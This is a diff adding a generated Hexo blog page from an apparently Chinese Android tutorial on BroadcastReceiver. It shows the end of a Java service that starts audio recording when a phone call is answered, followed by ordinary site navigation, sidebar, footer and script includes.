+                }
+                break;
+            case TelephonyManager.CALL_STATE_OFFHOOK://摘机
+                if(recorder != null){
+                    //开始录音
+                    recorder.start();
+                }
+                break;
+
+            }
+        }
+
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        // TODO Auto-generated method stub
+        return super.onStartCommand(intent, flags, startId);
+    }
+}
+</code></pre>
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Android基础/" rel="tag"># Android基础</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/02/13/基础--Activity&页面跳转&数据传递/" rel="next" title="Android基础--Activity&页面跳转&数据传递">
+                <i class="fa fa-chevron-left"></i> Android基础--Activity&页面跳转&数据传递
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/02/13/基础--服务 Service/" rel="prev" title="Android基础--服务 Service">
+                Android基础--服务 Service <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+          
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/02/13/基础--广播 BroadcastReceiver/"
+           data-title="Android基础--广播 BroadcastReceiver" data-url="http://yoursite.com/2017/02/13/基础--广播 BroadcastReceiver/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://ojupj7fr2.bkt.clouddn.com/blog_xintouxiang.png"
+               alt="yass" />
+          <p class="site-author-name" itemprop="name">yass</p>
+          <p class="site-description motion-element" itemprop="description">人艰不拆</p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">44</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#导语"><span class="nav-number">1.</span> <span class="nav-text">导语</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#广播"><span class="nav-number"></span> <span class="nav-text">广播</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#进程优先级"><span class="nav-number"></span> <span class="nav-text">进程优先级</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yass</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"yassblog"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    
+    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
